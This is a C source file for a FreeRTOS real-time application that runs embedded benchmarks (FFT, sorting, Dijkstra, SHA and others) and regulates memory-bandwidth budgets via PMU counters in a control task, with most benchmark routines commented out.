/*
 * FreeRTOS Kernel V10.2.1
 * Copyright (C) 2019 Amazon.com, Inc. or its affiliates.  All Rights Reserved.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 * http://www.FreeRTOS.org
 * http://aws.amazon.com/freertos
 *
 * 1 tab == 4 spaces!
 */

/* FreeRTOS kernel includes. */
#include <FreeRTOS.h>
//
#include "timers.h"
#include <stdio.h>
#include <string.h>
#include <task.h>
#include <time.h>

#include <irq.h>
#include <plat.h>
#include <uart.h>

#include "semphr.h"
#include <gic.h>
#include <stdlib.h>

#include <bandwidth.h>
#include <dijkstra.h>
#include <disparity.h>
#include <ecrts2019_images_64_48.h>
#include <fft.h>
#include <mser.h>
#include <pmu.h>
#include <qsort.h>
#include <regulation.h>
#include <sdvbs_common.h>
#include <sha.h>
#include <sorting.h>

// #include <bench.h>
// #include <budget.h>
#include <benchmarks.h>
#include <data.h>
#include <misc.h>

#include <fann.h>

#include <pesos_treinados.h>


#if 0
#define PRINT(fmt, ...) printf("[DEBUG] " fmt, ##__VA_ARGS__)
#else
#define PRINT(fmt, ...) ((void)0)
#endif

//=================================================================================

QITEM *qHead = NULL;

int g_qCount = 0;
NODE rgnNodes[NUM_NODES];
int ch;
int iPrev, iNode;
int iCost, iDist;
int AdjMatrix[666][NUM_NODES];

//=================================================================================

// /**
//  * @brief  Converts a boolean array into a single 32-bit bitmask.
//  *
//  * This function iterates through a boolean array. For each 'true' value
//  * at index 'i', it sets the i-th bit in the resulting integer.
//  *
//  * @param  arr   The input boolean array.
//  * @param  size  The number of elements in the array to process.
//  * @return A uint32_t where each bit corresponds to a 'true' element.
//  */
// uint32_t convert_array_to_bitmask(const bool arr[], int size) {
//   uint32_t bitmask = 0;
//
//   // Loop through each element of the boolean array.
//   for (int i = 0; i < size; i++) {
//     if (arr[i]) {
//       // If the element is true, set the corresponding bit in the mask
//       // using the bitwise OR assignment operator.
//       bitmask |= (1U << i);
//     }
//   }
//
//   return bitmask;
// }

#define VM_NUM 0

Benchmark *benchmark = NULL;
TaskHandle_t task_handlers[TASK_QUANTITY];
uint32_t pmu_overflowed = -1;
bool end_application = false;

#if VM_0_REGULATION
static void sgi_pmu_0() {
  PRINT("sgi signal pmu 0\n");
  pmu_overflowed = 0;
  vm_conf[VM_NUM].sgi_suspend_task_budget = 1;
}

static void sgi_pmu_1() {
  PRINT("sgi signal pmu 1\n");
  pmu_overflowed = 1;
  vm_conf[VM_NUM].sgi_suspend_task_budget = 1;
}

void config_counter() {
  PRINT("Configured counter.\n");
  HC_PMU_config_counter(
      vm_conf[VM_NUM].pmu_counter_pair_rw, vm_conf[VM_NUM].new_read_budget,
      vm_conf[VM_NUM].new_write_budget, UNUSED_ARG, UNUSED_ARG);
}

void start_counter() {
  HC_PMU_start_counter(vm_conf[VM_NUM].pmu_counter_pair_rw);
  PRINT("Started counter.\n");
  // resume all tasks
  for (int task_num = 0; task_num < TASK_QUANTITY; ++task_num) {
    // printf("resuming task %d\n", task_num);
    vTaskResume(task_handlers[task_num]);
  }
}

void stop_counter() {
  // suspend all tasks
  for (int task_num = 0; task_num < TASK_QUANTITY; ++task_num) {
    PRINT("suspending task %d\n", task_num);
    vTaskSuspend(task_handlers[task_num]);
  }
  HC_PMU_stop_counter(vm_conf->pmu_counter_pair_rw);
  PRINT("Stoped counter.\n");
}

// static void t0_suspend_task_budget_sgi() {
//   vm_conf[VM_NUM].sgi_suspend_task_budget[TASK_0] = 1;
// }
//
// static void t1_suspend_task_budget_sgi() {
//   vm_conf[VM_NUM].sgi_suspend_task_budget[TASK_1] = 1;
// }
#endif

//================================================================================
//                            Beginning BW
//================================================================================

// void bandwdith_benchmark(void *pvParameters) {
//   TASK *task_conf = (TASK *)pvParameters;
//   volatile uint64_t sum = 0;
//
//   int *g_mem_ptr = (int *)malloc(BW_DEFAULT_ALLOC_SIZE);
//   memset((char *)g_mem_ptr, 1, BW_DEFAULT_ALLOC_SIZE);
//
//   for (uint64_t i = 0; i < BW_DEFAULT_ALLOC_SIZE / sizeof(int); i++)
//     g_mem_ptr[i] = i;
//
//   const TickType_t xFrequency = pdMS_TO_TICKS(task_conf->periodicity);
//   TickType_t xLastWakeTime = xTaskGetTickCount();
//
//   while (1) {
//     for (uint8_t bench_exe = 0; bench_exe < BENCHMARK_MAX_EXE; bench_exe++) {
//       TickType_t start = xTaskGetTickCount();
//       TickType_t deadline = start + task_conf->deadline_ms;
//
//       start_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//
// #if VM_0_REGULATION
//       HC_PMU_config_counter(
//           task_conf->pmu_counter_a,
//           vm_conf[VM_NUM].new_read_budget[task_conf->task_num],
//           vm_conf[VM_NUM].new_write_budget[task_conf->task_num], UNUSED_ARG,
//           task_conf->task_num);
//       HC_PMU_start_counter(task_conf->pmu_counter_a);
// #endif
//       sum += bench_read(g_mem_ptr);
//       sum += bench_write(g_mem_ptr);
// #if VM_0_REGULATION
//       HC_PMU_stop_counter(task_conf->pmu_counter_a);
// #endif
//       sum = 0;
//       TickType_t end = xTaskGetTickCount();
//
//       // deadline
//       if (!task_conf->show_exe_info) {
//         vm_conf[VM_NUM].cycle_per_period[task_conf->task_num][bench_exe] =
//             get_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//         vm_conf[VM_NUM].task_start_time[task_conf->task_num][bench_exe] =
//         start; vm_conf[VM_NUM].task_deadline[task_conf->task_num][bench_exe]
//         =
//             deadline;
//         vm_conf[VM_NUM].task_end_time[task_conf->task_num][bench_exe] = end;
//
//         if (end <= deadline)
//           vm_conf[VM_NUM].deadline_met_counter[task_conf->task_num]++;
//         else {
//           vm_conf[VM_NUM].deadline_missed_counter[task_conf->task_num]++;
//           xLastWakeTime = end;
//         }
//       }
//
//       vTaskDelayUntil(&xLastWakeTime, xFrequency);
//     }
//
//     xLastWakeTime = xTaskGetTickCount();
//
// #if !VM_0_REGULATION
//     if (!task_conf->show_exe_info) {
//       vTaskDelay(500);
//       print_end_info_no_reg(VM_NUM, task_conf->task_num,
//       pcTaskGetName(NULL));
//     }
//
// #endif
//     task_conf->show_exe_info = 1;
//   }
//
//   free(g_mem_ptr);
// }

//================================================================================
//                              End BW
//================================================================================

//================================================================================
//                          Beginning Disparity
//================================================================================

// void disparity_benchmark(void *pvParameters) {
//   TASK *task_conf = (TASK *)pvParameters;
//
//   const TickType_t xFrequency = pdMS_TO_TICKS(PERIOD_MS_TASK_0);
//   TickType_t xLastWakeTime = xTaskGetTickCount();
//
//   while (1) {
//     for (uint8_t bench_exe = 0; bench_exe < BENCHMARK_MAX_EXE; bench_exe++) {
//       TickType_t start = xTaskGetTickCount();
//       TickType_t deadline = start + task_conf->deadline_ms;
//
//       start_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//
// #if VM_0_REGULATION
//       HC_PMU_config_counter(
//           task_conf->pmu_counter_a,
//           vm_conf[VM_NUM].new_read_budget[task_conf->task_num],
//           vm_conf[VM_NUM].new_write_budget[task_conf->task_num], UNUSED_ARG,
//           task_conf->task_num);
//       HC_PMU_start_counter(task_conf->pmu_counter_a);
// #endif
//       I2D *imleft = (I2D *)img1;
//       I2D *imright = (I2D *)img2;
//       int WIN_SZ = 8, SHIFT = 64;
//       char signature[2] = {66, 77};
//       short int bits_per_pixel = 24;
//
//       // Check if images are valid BMP images.
//       if (imleft->height <= 0 || imleft->width <= 0 || signature[0] != 'B' ||
//           signature[1] != 'M' ||
//           (bits_per_pixel != 24 && bits_per_pixel != 8)) {
//         continue;
//       }
//       if (imright->height <= 0 || imright->width <= 0 || signature[0] != 'B'
//       ||
//           signature[1] != 'M' ||
//           (bits_per_pixel != 24 && bits_per_pixel != 8)) {
//         continue;
//       }
//
//       I2D *retDisparity = getDisparity(imleft, imright, WIN_SZ, SHIFT);
//
// #if VM_0_REGULATION
//       HC_PMU_stop_counter(task_conf->pmu_counter_a);
// #endif
//       TickType_t end = xTaskGetTickCount();
//
//       // deadline
//       if (!task_conf->show_exe_info) {
//         vm_conf[VM_NUM].cycle_per_period[task_conf->task_num][bench_exe] =
//             get_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//         vm_conf[VM_NUM].task_start_time[task_conf->task_num][bench_exe] =
//         start; vm_conf[VM_NUM].task_deadline[task_conf->task_num][bench_exe]
//         =
//             deadline;
//         vm_conf[VM_NUM].task_end_time[task_conf->task_num][bench_exe] = end;
//
//         if (end <= deadline)
//           vm_conf[VM_NUM].deadline_met_counter[task_conf->task_num]++;
//         else {
//           vm_conf[VM_NUM].deadline_missed_counter[task_conf->task_num]++;
//           xLastWakeTime = end;
//         }
//       }
//
//       vTaskDelayUntil(&xLastWakeTime, xFrequency);
//     }
//
//     xLastWakeTime = xTaskGetTickCount();
//
// #if !VM_0_REGULATION
//     if (!task_conf->show_exe_info) {
//       vTaskDelay(1000);
//       print_end_info_no_reg(VM_NUM, task_conf->task_num,
//       pcTaskGetName(NULL));
//     }
// #endif
//     task_conf->show_exe_info = 1;
//   }
// }

//================================================================================
//                              End Disparity
//================================================================================

//================================================================================
//                           Beginning MSER
//================================================================================
unsigned char spt[27 * 1 * 4 + 8];
unsigned char sstrides_pt[16];
unsigned char svisited_pt[16];
unsigned char sjoins_pt[8 + 88 * 66 * 4];
unsigned char sforest_pt[16 * 1808];
unsigned char sregion_pt[32 * 1808];
unsigned char spairs_pt[8 * 1808];
unsigned char sacc_pt[8 + 46464];
unsigned char sell_pt[8 + 1080];

// void mser_benchmark(void *pvParameters) {
//   TASK *task_conf = (TASK *)pvParameters;
//
//   int i, j, k;
//   I2D *I;
//   I2D *It;
//   int rows = 196, cols = 98;
//
//   I = (I2D *)mserb;
//   rows = I->height;
//   cols = I->width;
//
//   It = (I2D *)mserb1;
//
//   k = 0;
//   for (i = 0; i < cols; i++) {
//     for (j = 0; j < rows; j++) {
//       asubsref(It, k++) = subsref(I, j, i);
//     }
//   }
//
//   const TickType_t xFrequency = pdMS_TO_TICKS(task_conf->periodicity);
//   TickType_t xLastWakeTime = xTaskGetTickCount();
//
//   while (1) {
//     for (uint8_t bench_exe = 0; bench_exe < BENCHMARK_MAX_EXE; bench_exe++) {
//       TickType_t start = xTaskGetTickCount();
//       TickType_t deadline = start + task_conf->deadline_ms;
//
//       start_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//
// #if VM_0_REGULATION
//       HC_PMU_config_counter(
//           task_conf->pmu_counter_a,
//           vm_conf[VM_NUM].new_read_budget[task_conf->task_num],
//           vm_conf[VM_NUM].new_write_budget[task_conf->task_num], UNUSED_ARG,
//           task_conf->task_num);
//       HC_PMU_start_counter(task_conf->pmu_counter_a);
// #endif
//       mser(It, 2);
//
// #if VM_0_REGULATION
//       HC_PMU_stop_counter(task_conf->pmu_counter_a);
// #endif
//       TickType_t end = xTaskGetTickCount();
//
//       // deadline
//       if (!task_conf->show_exe_info) {
//         vm_conf[VM_NUM].cycle_per_period[task_conf->task_num][bench_exe] =
//             get_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//         vm_conf[VM_NUM].task_start_time[task_conf->task_num][bench_exe] =
//         start; vm_conf[VM_NUM].task_deadline[task_conf->task_num][bench_exe]
//         =
//             deadline;
//         vm_conf[VM_NUM].task_end_time[task_conf->task_num][bench_exe] = end;
//
//         if (end <= deadline)
//           vm_conf[VM_NUM].deadline_met_counter[task_conf->task_num]++;
//         else {
//           vm_conf[VM_NUM].deadline_missed_counter[task_conf->task_num]++;
//           xLastWakeTime = end;
//         }
//       }
//
//       vTaskDelayUntil(&xLastWakeTime, xFrequency);
//     }
//
//     xLastWakeTime = xTaskGetTickCount();
//
// #if !VM_0_REGULATION
//     if (!task_conf->show_exe_info) {
//       vTaskDelay(1500);
//       print_end_info_no_reg(VM_NUM, task_conf->task_num,
//       pcTaskGetName(NULL));
//     }
// #endif
//     task_conf->show_exe_info = 1;
//   }
// }

//================================================================================
//                              End MSER
//================================================================================

//================================================================================
//                              Beginning FFT
//================================================================================

// void fft_benchmark(void *pvParameters) {
//   TASK *task_conf = (TASK *)pvParameters;
//
//   uint32_t A_re[NUM_POINTS];
//   uint32_t A_im[NUM_POINTS];
//   uint32_t W_re[NUM_POINTS / 2];
//   uint32_t W_im[NUM_POINTS / 2];
//
//   const TickType_t xFrequency = pdMS_TO_TICKS(task_conf->periodicity);
//   TickType_t xLastWakeTime = xTaskGetTickCount();
//
//   while (1) {
//     for (uint8_t bench_exe = 0; bench_exe < BENCHMARK_MAX_EXE; bench_exe++) {
//       TickType_t start = xTaskGetTickCount();
//       TickType_t deadline = start + task_conf->deadline_ms;
//
//       start_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//
// #if VM_0_REGULATION
//       HC_PMU_config_counter(
//           task_conf->pmu_counter_a,
//           vm_conf[VM_NUM].new_read_budget[task_conf->task_num],
//           vm_conf[VM_NUM].new_write_budget[task_conf->task_num], UNUSED_ARG,
//           task_conf->task_num);
//       HC_PMU_start_counter(task_conf->pmu_counter_a);
// #endif
//       int n = NUM_POINTS;
//       init_array(n, A_re, A_im);
//       compute_W(n, W_re, W_im);
//       fft(n, A_re, A_im, W_re, W_im);
//       permute_bitrev(n, A_re, A_im);
//
// #if VM_0_REGULATION
//       HC_PMU_stop_counter(task_conf->pmu_counter_a);
// #endif
//       TickType_t end = xTaskGetTickCount();
//
//       // deadline
//       if (!task_conf->show_exe_info) {
//         vm_conf[VM_NUM].cycle_per_period[task_conf->task_num][bench_exe] =
//             get_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//         vm_conf[VM_NUM].task_start_time[task_conf->task_num][bench_exe] =
//         start; vm_conf[VM_NUM].task_deadline[task_conf->task_num][bench_exe]
//         =
//             deadline;
//         vm_conf[VM_NUM].task_end_time[task_conf->task_num][bench_exe] = end;
//
//         if (end <= deadline)
//           vm_conf[VM_NUM].deadline_met_counter[task_conf->task_num]++;
//         else {
//           vm_conf[VM_NUM].deadline_missed_counter[task_conf->task_num]++;
//           xLastWakeTime = end;
//         }
//       }
//
//       vTaskDelayUntil(&xLastWakeTime, xFrequency);
//     }
//
//     xLastWakeTime = xTaskGetTickCount();
//
// #if !VM_0_REGULATION
//     if (!task_conf->show_exe_info) {
//       vTaskDelay(2000);
//       print_end_info_no_reg(VM_NUM, task_conf->task_num,
//       pcTaskGetName(NULL));
//     }
// #endif
//     task_conf->show_exe_info = 1;
//   }
// }

//================================================================================
//                                End FFT
//================================================================================

//================================================================================
//                              Beginning sorting
//================================================================================

// void sorting_benchmark(void *pvParameters) {
//   TASK *task_conf = (TASK *)pvParameters;
//
//   const TickType_t xFrequency = pdMS_TO_TICKS(task_conf->periodicity);
//   TickType_t xLastWakeTime = xTaskGetTickCount();
//
//   while (1) {
//     for (uint8_t bench_exe = 0; bench_exe < BENCHMARK_MAX_EXE; bench_exe++) {
//       TickType_t start = xTaskGetTickCount();
//       TickType_t deadline = start + task_conf->deadline_ms;
//
//       start_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//
// #if VM_0_REGULATION
//       HC_PMU_config_counter(
//           task_conf->pmu_counter_a,
//           vm_conf[VM_NUM].new_read_budget[task_conf->task_num],
//           vm_conf[VM_NUM].new_write_budget[task_conf->task_num], UNUSED_ARG,
//           task_conf->task_num);
//       HC_PMU_start_counter(task_conf->pmu_counter_a);
// #endif
//       int orig[MAX_SORTING], copy[MAX_SORTING], i;
//
//       void *function[NUM_SORT] = {&selection_sort, &quick_sort,
//                                   &shell_sort,     &stdlib_qsort,
//                                   &insertion_sort, &bubble_sort};
//       char *sort_name[NUM_SORT] = {"Selection sort", "Quicksort",
//                                    "Shellsort",      "Qsort",
//                                    "Insertion sort", "Bubble sort"};
//
//       fill_array(orig, MAX_SORTING);
//
//       for (i = 0; i < NUM_SORT; i++)
//         execute_sort(orig, copy, MAX_SORTING, sort_name[i], function[i]);
//
// #if VM_0_REGULATION
//       HC_PMU_stop_counter(task_conf->pmu_counter_a);
// #endif
//       TickType_t end = xTaskGetTickCount();
//
//       // deadline
//       if (!task_conf->show_exe_info) {
//         vm_conf[VM_NUM].cycle_per_period[task_conf->task_num][bench_exe] =
//             get_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//         vm_conf[VM_NUM].task_start_time[task_conf->task_num][bench_exe] =
//         start; vm_conf[VM_NUM].task_deadline[task_conf->task_num][bench_exe]
//         =
//             deadline;
//         vm_conf[VM_NUM].task_end_time[task_conf->task_num][bench_exe] = end;
//
//         if (end <= deadline)
//           vm_conf[VM_NUM].deadline_met_counter[task_conf->task_num]++;
//         else {
//           vm_conf[VM_NUM].deadline_missed_counter[task_conf->task_num]++;
//           xLastWakeTime = end;
//         }
//       }
//
//       vTaskDelayUntil(&xLastWakeTime, xFrequency);
//     }
//
//     xLastWakeTime = xTaskGetTickCount();
//
// #if !VM_0_REGULATION
//     if (!task_conf->show_exe_info) {
//       vTaskDelay(2500);
//       print_end_info_no_reg(VM_NUM, task_conf->task_num,
//       pcTaskGetName(NULL));
//     }
// #endif
//     task_conf->show_exe_info = 1;
//   }
// }

//================================================================================
//                                End sorting
//================================================================================

//================================================================================
//                              Beginning qsort
//================================================================================

// void qsort_benchmark(void *pvParameters) {
//   TASK *task_conf = (TASK *)pvParameters;
//
//   const TickType_t xFrequency = pdMS_TO_TICKS(task_conf->periodicity);
//   TickType_t xLastWakeTime = xTaskGetTickCount();
//
//   while (1) {
//     for (uint8_t bench_exe = 0; bench_exe < BENCHMARK_MAX_EXE; bench_exe++) {
//       TickType_t start = xTaskGetTickCount();
//       TickType_t deadline = start + task_conf->deadline_ms;
//
//       start_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//
// #if VM_0_REGULATION
//       HC_PMU_config_counter(
//           task_conf->pmu_counter_a,
//           vm_conf[VM_NUM].new_read_budget[task_conf->task_num],
//           vm_conf[VM_NUM].new_write_budget[task_conf->task_num], UNUSED_ARG,
//           task_conf->task_num);
//       HC_PMU_start_counter(task_conf->pmu_counter_a);
// #endif
//
//       struct my3DVertexStruct array[QSORT_MAXARRAY];
//
//       int numRows = sizeof(qsort_input_data) / sizeof(qsort_input_data[0]);
//       int count = 0;
//
//       // Process the array instead of reading from a file
//       for (int i = 0; i < numRows && count < QSORT_MAXARRAY; i++) {
//         array[count].x = qsort_input_data[i][0];
//         array[count].y = qsort_input_data[i][1];
//         array[count].z = qsort_input_data[i][2];
//         array[count].distance = (array[count].x * array[count].x) +
//                                 (array[count].y * array[count].y) +
//                                 (array[count].z * array[count].z);
//         count++;
//       }
//
//       qsort(array, count, sizeof(struct my3DVertexStruct), qsort_compare);
//
// #if VM_0_REGULATION
//       HC_PMU_stop_counter(task_conf->pmu_counter_a);
// #endif
//       TickType_t end = xTaskGetTickCount();
//
//       // deadline
//       if (!task_conf->show_exe_info) {
//         vm_conf[VM_NUM].cycle_per_period[task_conf->task_num][bench_exe] =
//             get_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//         vm_conf[VM_NUM].task_start_time[task_conf->task_num][bench_exe] =
//         start; vm_conf[VM_NUM].task_deadline[task_conf->task_num][bench_exe]
//         =
//             deadline;
//         vm_conf[VM_NUM].task_end_time[task_conf->task_num][bench_exe] = end;
//
//         if (end <= deadline)
//           vm_conf[VM_NUM].deadline_met_counter[task_conf->task_num]++;
//         else {
//           vm_conf[VM_NUM].deadline_missed_counter[task_conf->task_num]++;
//           xLastWakeTime = end;
//         }
//       }
//
//       vTaskDelayUntil(&xLastWakeTime, xFrequency);
//     }
//
//     xLastWakeTime = xTaskGetTickCount();
//
// #if !VM_0_REGULATION
//     if (!task_conf->show_exe_info) {
//       vTaskDelay(3000);
//       print_end_info_no_reg(VM_NUM, task_conf->task_num,
//       pcTaskGetName(NULL));
//     }
// #endif
//     task_conf->show_exe_info = 1;
//   }
// }

//================================================================================
//                                End qsort
//================================================================================

//================================================================================
//                              Beginning Dijkstra
//================================================================================

// void dijkstra_benchmark(void *pvParameters) {
//   TASK *task_conf = (TASK *)pvParameters;
//
//   const TickType_t xFrequency = pdMS_TO_TICKS(task_conf->periodicity);
//   TickType_t xLastWakeTime = xTaskGetTickCount();
//
//   while (1) {
//     for (uint8_t bench_exe = 0; bench_exe < BENCHMARK_MAX_EXE; bench_exe++) {
//       TickType_t start = xTaskGetTickCount();
//       TickType_t deadline = start + task_conf->deadline_ms;
//
//       start_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//
// #if VM_0_REGULATION
//       HC_PMU_config_counter(
//           task_conf->pmu_counter_a,
//           vm_conf[VM_NUM].new_read_budget[task_conf->task_num],
//           vm_conf[VM_NUM].new_write_budget[task_conf->task_num], UNUSED_ARG,
//           task_conf->task_num);
//       HC_PMU_start_counter(task_conf->pmu_counter_a);
// #endif
//
//       int i, j, k;
//
//       for (i = 0, j = NUM_NODES / 2; i < 100; i++, j++) {
//         j = j % NUM_NODES;
//         dijkstra(i, j);
//       }
//
// #if VM_0_REGULATION
//       HC_PMU_stop_counter(task_conf->pmu_counter_a);
// #endif
//       TickType_t end = xTaskGetTickCount();
//
//       // deadline
//       if (!task_conf->show_exe_info) {
//         vm_conf[VM_NUM].cycle_per_period[task_conf->task_num][bench_exe] =
//             get_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//         vm_conf[VM_NUM].task_start_time[task_conf->task_num][bench_exe] =
//         start; vm_conf[VM_NUM].task_deadline[task_conf->task_num][bench_exe]
//         =
//             deadline;
//         vm_conf[VM_NUM].task_end_time[task_conf->task_num][bench_exe] = end;
//
//         if (end <= deadline)
//           vm_conf[VM_NUM].deadline_met_counter[task_conf->task_num]++;
//         else {
//           vm_conf[VM_NUM].deadline_missed_counter[task_conf->task_num]++;
//           xLastWakeTime = end;
//         }
//       }
//
//       vTaskDelayUntil(&xLastWakeTime, xFrequency);
//     }
//
//     // xLastWakeTime = xTaskGetTickCount();
//
// #if !VM_0_REGULATION
//     if (!task_conf->show_exe_info) {
//       // vTaskDelay(3500);
//       vTaskDelay(7000);
//       print_end_info_no_reg(VM_NUM, task_conf->task_num,
//       pcTaskGetName(NULL));
//     }
// #endif
//     task_conf->show_exe_info = 1;
//   }
// }

//================================================================================
//                                End Dijkstra
//================================================================================

//================================================================================
//                              Beginning SHA
//================================================================================

// void sha_benchmark(void *pvParameters) {
//   TASK *task_conf = (TASK *)pvParameters;
//
//   const TickType_t xFrequency = pdMS_TO_TICKS(task_conf->periodicity);
//   TickType_t xLastWakeTime = xTaskGetTickCount();
//
//   while (1) {
//     for (uint8_t bench_exe = 0; bench_exe < BENCHMARK_MAX_EXE; bench_exe++) {
//       TickType_t start = xTaskGetTickCount();
//       TickType_t deadline = start + task_conf->deadline_ms;
//
//       start_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//
// #if VM_0_REGULATION
//       HC_PMU_config_counter(
//           task_conf->pmu_counter_a,
//           vm_conf[VM_NUM].new_read_budget[task_conf->task_num],
//           vm_conf[VM_NUM].new_write_budget[task_conf->task_num], UNUSED_ARG,
//           task_conf->task_num);
//       HC_PMU_start_counter(task_conf->pmu_counter_a);
// #endif
//       SHA_INFO sha_info;
//       sha_stream(&sha_info);
//
// #if VM_0_REGULATION
//       HC_PMU_stop_counter(task_conf->pmu_counter_a);
// #endif
//       TickType_t end = xTaskGetTickCount();
//       // deadline
//       if (!task_conf->show_exe_info) {
//         vm_conf[VM_NUM].cycle_per_period[task_conf->task_num][bench_exe] =
//             get_cycle_counting(task_conf->pmu_cpu_cycles_counter);
//         vm_conf[VM_NUM].task_start_time[task_conf->task_num][bench_exe] =
//         start; vm_conf[VM_NUM].task_deadline[task_conf->task_num][bench_exe]
//         =
//             deadline;
//         vm_conf[VM_NUM].task_end_time[task_conf->task_num][bench_exe] = end;
//
//         if (end <= deadline)
//           vm_conf[VM_NUM].deadline_met_counter[task_conf->task_num]++;
//         else {
//           vm_conf[VM_NUM].deadline_missed_counter[task_conf->task_num]++;
//           xLastWakeTime = end;
//         }
//       }
//
//       vTaskDelayUntil(&xLastWakeTime, xFrequency);
//     }
//
//     xLastWakeTime = xTaskGetTickCount();
//
// #if !VM_0_REGULATION
//     if (!task_conf->show_exe_info) {
//       // vTaskDelay(4000);
//       vTaskDelay(8000);
//       print_end_info_no_reg(VM_NUM, task_conf->task_num,
//       pcTaskGetName(NULL));
//     }
// #endif
//     task_conf->show_exe_info = 1;
//   }
// }

//================================================================================
//                                End SHA
//================================================================================

//================================================================================
//                           Beginning CTRL TASK
//================================================================================

#if VM_0_REGULATION
void ctrl_task(void *pvParameters) {
  // task periodicity
  const TickType_t frequency = pdMS_TO_TICKS(PERIOD_MS_TASK_CTRL);
  TickType_t last_wake_time = xTaskGetTickCount();

  // check VM tasks' period
  const TickType_t control_period = pdMS_TO_TICKS(PERIOD_MS_TASK_ANY);

  // --- CORRECTED TIMING LOGIC ---
  // This variable will hold the start time of the current measurement period.
  TickType_t period_start_time = xTaskGetTickCount();

  uint8_t get_budget = 0;
  uint8_t info_showed = 0;
  uint8_t idx = 0;

  while (!end_application) {
    PRINT("begin control task\n");
    TickType_t current_time = xTaskGetTickCount();
    TickType_t period_end_time = 0; // Variable to store the exact end time

    if ((current_time - period_start_time) >= control_period && !get_budget) {
      stop_counter();

      PRINT("control TIMEOUT: \n");
      PRINT("(current_time - period_start_time) >= "
            "period_task_any\n");
      PRINT("(%lu - %lu) >= %lu | %lu >= %lu\n", current_time,
            period_start_time, control_period,
            (current_time - period_start_time), control_period);

      pmu_overflowed =
          UNUSED_VALUE; // Explicitly signal that a timeout occurred ---
      get_budget = 1;

    } else if (vm_conf[VM_NUM].sgi_suspend_task_budget && !get_budget) {
      stop_counter();
      get_budget = 1;
      PRINT("control OVERFLOW\n");
    } else {

      static int number = 0;
      PRINT("NOTHING %d\n", number++);
    }

    if (get_budget) {
      for (int i = 0; i < PMU_COUNT; ++i) {
        vm_conf[VM_NUM].PMU_raw_values[i][idx] =
            HC_regulator_get_raw_PMU_values(i, UNUSED_ARG);
      }

      PRINT("calling HC_regulator_get_new_budget\n");
      HC_regulator_budget_depleted(pmu_overflowed,
                                   benchmark_get_formula(benchmark));
      get_budget = 0;
      period_end_time = xTaskGetTickCount(); // Capture the end time on overflow

      // Calculate and store the duration of the period that just ended.
      TickType_t duration = period_end_time - period_start_time;
      vm_conf[VM_NUM].period_duration[idx] = duration;

      // The start time for the *next* period is now.
      period_start_time = period_end_time;

      vm_conf[VM_NUM].sgi_suspend_task_budget = 0;

      vm_conf[VM_NUM].has_overflowed[idx] = pmu_overflowed != UNUSED_VALUE;
      HC_regulator_get_current_used_budget(UNUSED_ARG, READ);
      vm_conf[VM_NUM].used_r_budget_period[idx] =
          HC_regulator_get_current_used_budget(UNUSED_ARG, READ);
      vm_conf[VM_NUM].used_w_budget_period[idx] =
          HC_regulator_get_current_used_budget(UNUSED_ARG, WRITE);

      vm_conf[VM_NUM].new_read_budget =
          HC_regulator_get_new_budget(UNUSED_ARG, READ);
      vm_conf[VM_NUM].new_write_budget =
          HC_regulator_get_new_budget(UNUSED_ARG, WRITE);

      vm_conf[VM_NUM].calc_r_budget_period[idx] =
          vm_conf[VM_NUM].new_read_budget;
      vm_conf[VM_NUM].calc_w_budget_period[idx] =
          vm_conf[VM_NUM].new_write_budget;

      PRINT("idx %d\n", idx);
      if (idx < PERIOD_QNT && vm_conf[VM_NUM].new_read_budget != 0 &&
          vm_conf[VM_NUM].new_write_budget != 0) {
        idx++;
        PRINT("idx to %d\n", idx);
      }

      PRINT("done\n");

      // showing results
      if (idx >= PERIOD_QNT && !info_showed) {
        /* && task_conf.show_exe_info && */
        // vTaskDelay((3500));

        for (int task_index = 0; task_index < TASK_QUANTITY; ++task_index) {
          info_t *info = benchmark_get_info(benchmark, VM_NUM, task_index);
          vm_conf[VM_NUM].completed_runs_per_task[task_index] =
              info->task_overruns + info->task_underruns;

          // Reset the counters for this specific task for the next run
          info->task_overruns = 0;
          info->task_underruns = 0;
        }

        idx = 0;

        // printf("showing results\n");
        print_vm_info(vm_conf[VM_NUM], benchmark);

        formula_t formula = benchmark_get_formula(benchmark) + 1;
        if (formula >= FORMULA_COUNT) {
          info_showed = 1;
          PRINT("INFO SHOWED. END.\n");
          printf("end iteration\n");
          end_application = true;
        } else {
          // task_conf.show_exe_info = 0;
          PRINT("set budget formula from %d to %d\n",       //
                benchmark_get_formula(benchmark), formula); //
          benchmark_set_formula(benchmark, formula);
        }
      }

      period_start_time = xTaskGetTickCount();
      config_counter();
      start_counter();
    }

    vTaskDelayUntil(&last_wake_time, frequency);
    last_wake_time = xTaskGetTickCount();

    PRINT("end control task\n");
  }

  vTaskDelete(NULL);
}
#endif
//================================================================================
//                              End CTRL TASK
//================================================================================

// void benchmark(void *pvParameters) {
//   TASK *task_conf = (TASK *)pvParameters;
